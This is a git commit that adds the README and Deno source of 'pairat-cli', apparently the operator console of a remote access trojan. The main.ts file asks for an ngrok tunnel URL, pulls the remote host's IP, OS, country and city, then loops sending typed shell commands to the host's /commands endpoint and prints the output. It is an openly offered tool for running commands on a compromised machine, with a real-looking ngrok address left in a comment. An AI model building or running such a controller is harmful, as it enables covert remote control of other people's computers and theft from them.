f170aae9df40c8c6690cc0d0d691921a3fa706c1
pai <69026987+ELPanaJose@users.noreply.github.com>
2021-10-10 23:13:21 -0500

    lol :floppy_disk:
    :cookie:

---
+++ README.md
@@ -0,0 +1,11 @@
+<h1>pairat-cli</h1>
+
+you need deno for this:https://deno.land/
+
+if you want to use it clone the repo
+
+and type: ```deno run -A main.ts```
+
+
+
+
---
+++ main.ts
@@ -0,0 +1,42 @@
+import * as ink from "https://deno.land/x/ink/mod.ts";
+
+console.log("type a url like this: https://026f-181-58-226-188.ngrok.io")
+const text = Deno.readTextFile("welcome.txt");
+text.then((response) => console.log(response));
+console.log("version 0.0.1")
+console.log("Type ctrl + c to exit")
+const url: any = prompt("enter the ngrok url:");
+if (!url || url.lenght === 0) {
+  console.log("put the url!");
+} else {
+  const getIp = await fetch(`${url}/ip`, { method: "GET" });
+  const ip = await getIp.json();
+
+  const getOs = await fetch(`${url}/ip/os`, { method: "GET" });
+  const os = await getOs.text();
+  // Print the info
+
+  console.log(ink.colorize("<blue>       connection info            </blue>"));
+  console.log(ink.colorize(`<yellow>       os: ${os}                  </yellow>`));
+  console.log(ink.colorize(`<magenta>       ip: ${ip.query}            </magenta>`));
+  console.log(ink.colorize(`<green>       country: ${ip.country}     </green>`));
+  console.log(ink.colorize(`<cyan>       city: ${ip.city}             </cyan>`));
+
+  while (true) {
+    const input = prompt("💀>");
+
+    // https://db10-181-58-226-188.ngrok.io
+    const rawResponse = await fetch(`${url}/commands`, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        command: input,
+      }),
+    });
+    const content = await rawResponse.json();
+    console.log(content);
+  }
+}
